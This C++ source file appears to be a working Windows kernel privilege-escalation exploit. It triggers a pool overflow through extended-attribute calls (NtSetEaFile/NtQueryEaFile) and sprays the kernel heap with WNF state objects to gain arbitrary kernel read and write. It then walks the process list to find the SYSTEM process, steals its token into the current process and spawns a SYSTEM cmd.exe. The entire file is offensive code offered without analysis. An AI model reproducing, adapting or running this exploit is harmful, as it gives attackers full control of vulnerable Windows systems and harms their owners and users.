// ConsoleApplication11.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "nt.h"
#include <sddl.h>
__ZwQueryEaFile NtQueryEaFile = NULL;
__ZwSetEaFile  NtSetEaFile = NULL;
__NtCreateWnfStateName NtCreateWnfStateName = NULL;
__NtUpdateWnfStateData NtUpdateWnfStateData = NULL;
__NtQueryWnfStateData NtQueryWnfStateData = NULL;
__NtDeleteWnfStateData NtDeleteWnfStateData = NULL;
__NtDeleteWnfStateName NtDeleteWnfStateName = NULL;
WNF_STATE_NAME StateNames[SPRAY_COUNT] = { 0 };

UINT64 OVER_STATENAME = 0;

int initNtDll()
{
	HMODULE hNtDll = NULL;
	hNtDll = LoadLibrary("ntdll.dll");
	if (hNtDll == NULL)
	{
		printf("load ntdll failed!\r\n");
		return -1;
	}
	NtQueryEaFile = (__ZwQueryEaFile)GetProcAddress(hNtDll, "NtQueryEaFile");
	NtSetEaFile = (__ZwSetEaFile)GetProcAddress(hNtDll, "ZwSetEaFile");
	NtCreateWnfStateName = (__NtCreateWnfStateName)GetProcAddress(hNtDll, "NtCreateWnfStateName");
	NtUpdateWnfStateData = (__NtUpdateWnfStateData)GetProcAddress(hNtDll, "NtUpdateWnfStateData");
	NtQueryWnfStateData = (__NtQueryWnfStateData)GetProcAddress(hNtDll, "NtQueryWnfStateData");
	NtDeleteWnfStateData = (__NtDeleteWnfStateData)GetProcAddress(hNtDll, "NtDeleteWnfStateData");
	NtDeleteWnfStateName = (__NtDeleteWnfStateName)GetProcAddress(hNtDll, "NtDeleteWnfStateName");
	if (NtQueryEaFile == NULL ||
		NtSetEaFile == NULL ||
		NtCreateWnfStateName == NULL ||
		NtUpdateWnfStateData == NULL ||
		NtQueryWnfStateData == NULL ||
		NtDeleteWnfStateData == NULL ||
		NtDeleteWnfStateName == NULL)
	{
		printf("not found  functions\r\n");
		return -1;
	}

	return 0;
}

int tiggerLeak()
{
	PFILE_GET_EA_INFORMATION EaList = NULL;
	PFILE_GET_EA_INFORMATION EaListCP = NULL;
	PVOID eaData = NULL;
	DWORD dwNumberOfBytesWritten = 0;
	UCHAR payLoad[PAYLOAD_SIZE] = { 0 };
	PFILE_FULL_EA_INFORMATION curEa = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK eaStatus = { 0 };
	NTSTATUS rc;
	PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL;
	PISECURITY_DESCRIPTOR pSecurity = NULL;
	PUCHAR pd = NULL;
	PUCHAR StateDataLock = NULL;
	PUINT64 StateData = NULL;
	PUINT64 StateName = NULL;
	PUINT64 parent = NULL;
	PUINT AllocatedSize = NULL;
	PUINT DataSize = NULL;
	int state = -1;


	hFile = CreateFileA("payload",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("create the file failed\r\n");
		goto ERROR_HANDLE;
	}


	WriteFile(hFile, "This files has an optional .COMMENTS EA\n",
		strlen("This files has an optional .COMMENTS EA\n"),
		&dwNumberOfBytesWritten, NULL);




	curEa = (PFILE_FULL_EA_INFORMATION)payLoad;


	curEa->Flags = 0;
	
	curEa->EaNameLength = TIGGER_EA_NAME_LENGTH;
	curEa->EaValueLength = TIGGER_EA_VALUE_LENGTH;
	//align 4。
	curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);
	memcpy(curEa->EaName, TIGGER_EA_NAME, TIGGER_EA_NAME_LENGTH);
	RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, TIGGER_EA_VALUE_LENGTH, 'A');


	curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset);
	curEa->NextEntryOffset = 0;
	curEa->Flags = 0;
	
	curEa->EaNameLength = OVER_EA_NAME_LENGTH; 
	curEa->EaValueLength = OVER_EA_VALUE_LENGTH;
	memcpy(curEa->EaName, OVER_EA_NAME, OVER_EA_NAME_LENGTH); 
	RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, OVER_EA_VALUE_LENGTH, 0);
	pd = (PUCHAR)(curEa);

	AllocatedSize = (PUINT)(pd + 0x4 + 0x10);
	DataSize = (PUINT)(pd + 0x8 + 0x10); 
	*AllocatedSize = OVER_STATEDATA_LENGTH;
	*DataSize = OVER_STATEDATA_LENGTH;

	rc = NtSetEaFile(hFile, &eaStatus, payLoad, sizeof(payLoad));


	

	if (rc != 0)
	{
		printf("NtSetEaFile failed error code is %x\r\n", rc);
		goto ERROR_HANDLE;

	}
	eaData = malloc(sizeof(payLoad));
	if (eaData == NULL)
	{
		goto ERROR_HANDLE;
	}


	memset(eaData, 0, sizeof(payLoad));

	EaList = (PFILE_GET_EA_INFORMATION)malloc(100);
	if (EaList == NULL)
	{
		goto ERROR_HANDLE;
	}
	EaListCP = EaList;
	memset(EaList, 0, 100);



	memcpy(EaList->EaName, ".PA", strlen(".PA"));
	EaList->EaNameLength = (UCHAR)strlen(".PA");
	EaList->NextEntryOffset = 12; // align 4


	EaList = (PFILE_GET_EA_INFORMATION)((PUCHAR)EaList + 12);
	memcpy(EaList->EaName, ".PBB", strlen(".PBB"));
	EaList->EaNameLength = (UCHAR)strlen(".PBB");
	EaList->NextEntryOffset = 0;

	rc = NtQueryEaFile(hFile, &eaStatus, eaData, KERNAL_ALLOC_SIZE, FALSE, EaListCP, 100, 0, TRUE);
	

	state = 0;


ERROR_HANDLE:
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}
	if (EaList != NULL)
	{
		free(EaListCP);
		EaList = NULL;
	}

	if (eaData != NULL)
	{
		free(eaData);
		eaData = NULL;
	}

	if (pSecurity != NULL)
	{
		free(pSecurity);
		pSecurity = NULL;
	}
	return state;
}

int HeapSpray()
{
	NTSTATUS state = 0;
	
	PSECURITY_DESCRIPTOR pSD = nullptr;
	BYTE upData[0xa0] = { 0 };
	RtlFillMemory(upData, sizeof(upData), 'C');
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor("",
		SDDL_REVISION_1, &pSD, nullptr))
	{
		return -1;
	}

	for (int i = 0; i < SPRAY_COUNT; i++)
	{
		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, OVER_STATEDATA_LENGTH, pSD);
		if (state != 0)
		{
			return -1;
		}
		
	}  


	for (int i = 1; i < SPRAY_COUNT; i+=2)
	{

		state = NtDeleteWnfStateName(&StateNames[i]);
		if (state != 0)
		{
			return -1;
		}
		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;

		state = NtUpdateWnfStateData((PWNF_STATE_NAME)&StateNames[i - 1], &upData, 0xa0, NULL, NULL, NULL, 0);
		if (state != 0)
		{
			return -1;
		}
	}

	
	for (int i = 0; i < SPRAY_COUNT; i += 4)
	{
		NtDeleteWnfStateData(&StateNames[i], NULL);
		state = NtDeleteWnfStateName(&StateNames[i]);
		if (state != 0)
		{
			return -1;
		}
		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;
			   
	}

	
	if (pSD)
	{
		LocalFree(pSD);
	}


	return 0;
}





int tigger(UINT64 StateName)
{
	NTSTATUS state = 0;
	UINT64 name = StateName;
	BYTE upData[0x74] = { 0 };
	RtlFillMemory(upData, sizeof(upData), 'A');
	name ^= STATE_NAME_MASK;
	state = NtUpdateWnfStateData((PWNF_STATE_NAME)&name, &upData, 0x70, NULL, NULL, NULL, 0);
	return state;
}



int OverStateData(PWNF_STATE_NAME StateName, PUCHAR Buff)
{
	

	NTSTATUS state = NtUpdateWnfStateData(StateName, (const void*)Buff, OVER_STATEDATA_LENGTH, NULL, NULL, NULL, 0);

	return state;
}



NTSTATUS GetOverStateData(UINT64 StateName, PUCHAR Buff, PULONG size)
{
	WNF_CHANGE_STAMP Stamp;
	ULONG BufferSize = *size;
	UINT64 name = StateName;
	name ^= STATE_NAME_MASK;
	NTSTATUS state = NtQueryWnfStateData((PWNF_STATE_NAME)&name, NULL, NULL, &Stamp, Buff, &BufferSize);

	if (state != 0)
	{
		printf(__FUNCTION__  "failed size: %d state: %x\r\n", BufferSize, state);
		return state;
	}

	*size = BufferSize;
	return 0;
}


UINT64 GetProcessEprocess(UINT64 StateName, PUINT64 pid, UINT pidOffset=0x120, UINT eprocessOffset=0x128)
{
	
	UCHAR Buff[0x3000] = { 0 };
	ULONG BufferSize = 0x3000;
	int state = GetOverStateData(StateName, Buff, &BufferSize);

	if (state != 0)
	{
		printf(__FUNCTION__"filed %x\r\n", state);
		return 0;
	}



	if (BufferSize == 0) //idle
	{
		*pid = 0;
		return 0;
	}
	*pid = *((PUINT64)(Buff + pidOffset));
	return *((PUINT64)(Buff + eprocessOffset));
}


int GetProcessName(UINT64 StateName, PCHAR name)
{
	UCHAR Buff[0x5000] = { 0 };
	ULONG BufferSize = 0x5000;
	int state = GetOverStateData(StateName, Buff, &BufferSize);
	if (state != 0)
	{
		printf(__FUNCTION__"filed %x\r\n", state);
		return -1;
	}
	memcpy(name, Buff, 0x100 - 1);
	return 0;
}

UINT64 GetProcessToken(UINT64 StateName)
{
	UCHAR Buff[0x5000] = { 0 };
	ULONG BufferSize = 0x5000;
	int state = GetOverStateData(StateName, Buff, &BufferSize);
	if (state != 0)
	{
		printf(__FUNCTION__" filed %x\r\n", state);
		return -1;
	}
	
	return *(PUINT64)(Buff + 0x30);
}



NTSTATUS EnumProcessEprocess(PWNF_STATE_NAME StateName, PUCHAR Buff)
{

	BOOL Isexist = FALSE;
	for (int i = 0; i < SPRAY_COUNT; ++i)
	{
		if (*(PUINT64)StateName == *((PUINT64)&StateNames[i]))
		{
			Isexist = TRUE;
		}
	}
	if (Isexist == FALSE)
	{
		printf("the wnf obj is deleted!!!\r\n");
		return -1;
	}

	PWNF_NAME_INSTANCE NameIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);
	UINT64 eProcess = (UINT64)NameIns->CreatorProcess;
	if (eProcess == 0)
	{
		return -1;
	}
	NTSTATUS state = -1;
	
	
	UINT64 entry = (UINT64)(eProcess + PROCESS_ID_OFFSET);
	UINT64 systemEProcess = 0;
	for (;;)
	{
		NameIns->StateData = (_WNF_STATE_DATA*)(entry);
		state = OverStateData(StateName, Buff);
		if (state != 0)
			return -1;

		UINT64 pid = 0;
		UINT64 next = GetProcessEprocess(*(PULONGLONG)&(NameIns->StateName), &pid);

		

		
		// handle idle process
		if (pid == 0)
		{
			entry = entry + 0x269 - PROCESS_ID_OFFSET;

			NameIns->StateData = (_WNF_STATE_DATA*)(entry);
			state = OverStateData(StateName, Buff);
			if (state != 0)
				return -1;
			next = GetProcessEprocess(*(PULONGLONG)&(NameIns->StateName), &pid, 0x6f, 0x77);
			printf("EPROCESS: %llx PID: %lld\r\n", entry - 0x269, pid);
		}
	
		else
		{
			printf("EPROCESS: %llx PID: %lld\r\n", entry - PROCESS_ID_OFFSET, pid);
		}



		if (pid == 4)
		{
			printf("found system process\r\n");
			systemEProcess = entry - PROCESS_ID_OFFSET;
			break;
		}

		
		if (next == 0)
			break;

		entry = next - PROCESS_LIST_OFFSET + PROCESS_ID_OFFSET;
	}
			
	if (systemEProcess != 0)
	{
		NameIns->StateData = (_WNF_STATE_DATA*)(systemEProcess + TOKEN_OFFSET);
		state = OverStateData(StateName, Buff);
		if (state != 0)
			return -1;
		UINT64 token =  GetProcessToken(*(PULONGLONG)&(NameIns->StateName));
	

		UCHAR tokenBuff[0x5000] = { 0 };
		ULONG tokenBufferSize = 0x5000;

		NameIns->StateData = (_WNF_STATE_DATA*)(eProcess + TOKEN_OFFSET);
		state = OverStateData(StateName, Buff);
		if (state != 0)
			return -1;

		int state = GetOverStateData(*(PULONGLONG)&(NameIns->StateName), tokenBuff, &tokenBufferSize);
		if (state != 0)
		{
			printf(" filed %x %d\r\n", state, __LINE__);
			return -1;
		}

		
		*(PUINT64)(tokenBuff + 0x30) = token;

		NameIns->StateData = (_WNF_STATE_DATA*)(eProcess + TOKEN_OFFSET + 4);
		state = OverStateData(StateName, Buff);
		if (state != 0)
		{
			printf(" filed %x %d\r\n", state , __LINE__);
			return -1;
		}


		UINT64 name = *(PULONGLONG)&(NameIns->StateName);
		name ^= STATE_NAME_MASK;


	   state = NtUpdateWnfStateData((PWNF_STATE_NAME)(&name), tokenBuff + 4, 0x100, NULL, NULL, NULL, 0);

	   if (state != 0)
	   {
		   printf("re token failed state: %x\r\n", state);
		   return -1;
	   }

	   STARTUPINFO StartupInfo = { 0 };
	   PROCESS_INFORMATION ProcessInformation = { 0 };
		
	   if (!CreateProcess("C:\\Windows\\System32\\cmd.exe",
		   NULL,
		   NULL,
		   NULL,
		   FALSE,
		   CREATE_NEW_CONSOLE,
		   NULL,
		   NULL,
		   &StartupInfo,
		   &ProcessInformation))
	   {
		   printf("[-] Failed to Create Target Process: 0x%X\n", GetLastError());
		  return -1;
	   }

	   WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	}

	return 0;
}


int main()
{
	BOOL IsSuccess = FALSE;
	UINT Count = 0;
	PVOID pSelfEprocess = NULL;
	if (initNtDll() != 0)
	{
		printf("initNtDll filed!\r\n");
		
		goto PAUSE;
	}

	
	if (HeapSpray() != 0)
	{
		printf("HeapSpray filed!\r\n");
		goto PAUSE;
	}

	
RE_TRY:
	if (Count++ >= 1000)
	{
		printf("exp  filed!\r\n");
		goto PAUSE;
	}
	if (tiggerLeak() != 0)
	{
		printf("tigger leak filed!\r\n");
		goto PAUSE;
	}
	
	
	for (int i = 0; i < SPRAY_COUNT; i += 2)
	{
		WNF_CHANGE_STAMP Stamp;
		ULONG BufferSize = 0xa0;
		UCHAR Buff[OVER_STATEDATA_LENGTH] = { 0 };
		if (StateNames[i].Data[0] == 0 && StateNames[i].Data[1] == 0)
			continue;
		NTSTATUS state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
		if (state == 0xc0000023)
		{

			BufferSize = OVER_STATEDATA_LENGTH;
			state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
			if (state != 0)
			{
				;
			}
			else
			{
				PWNF_NAME_INSTANCE NameIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);
				
				if (NameIns->Header.NodeByteSize == 0xa8 &&
					NameIns->Header.NodeTypeCode == 0x903 &&
					NameIns->RunRef.Ptr == NULL
					)
				{
					if (EnumProcessEprocess(&StateNames[i], Buff) == 0)
					{

						IsSuccess = TRUE;
					}
					
					
				}
				
			}
		}
	}

	if (IsSuccess == FALSE)
		goto RE_TRY;


	IsSuccess = !IsSuccess;
	

PAUSE:
	system("pause");
	return 0;
}
